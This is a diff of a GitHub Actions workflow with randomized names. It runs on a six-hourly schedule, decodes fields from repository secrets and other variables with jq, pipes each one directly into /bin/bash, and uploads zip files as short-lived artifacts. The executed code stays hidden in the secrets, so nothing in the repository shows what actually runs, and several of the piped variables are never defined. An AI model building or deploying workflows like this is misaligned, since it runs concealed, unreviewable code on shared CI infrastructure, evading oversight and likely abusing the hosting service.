@@ -1,23 +1,28 @@
 name: allisonjavascript219
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '51 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: allisonjavascript219
         env:
-          ig23: ${{ secrets.ig23 }}
+          ti10: ${{ secrets.ti10 }}
         run: |
-          echo $ig23 | jq -r .btzh4821 | /bin/bash
-          echo $jmt4 | jq -r .byuc68 | /bin/bash
-          echo $jd7 | jq -r .sj17 | /bin/bash
-          echo $dbq75 | jq -r .ey7 | /bin/bash
-          echo $ypjl18 | jq -r .wl14 | /bin/bash
-          echo $ps0954 | jq -r .ulomp29287 | /bin/bash
-          echo $dfsl154 | jq -r .vg3571 | /bin/bash
+          printf '%s' "$ti10" | jq -r .yj4 | /bin/bash
+          echo $rxy50605 | jq -r .c01548 | /bin/bash
+          echo $j3 | jq -r .kz1 | /bin/bash
+          echo $kr077 | jq -r .ftrfp6027 | /bin/bash
+          printf '%s' "$arum0915" | jq -r .ysp3 | /bin/bash
+          echo $moub23451 | jq -r .zgzz839 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: L9D8inWH
+          path: "*.zip"
+          retention-days: 1
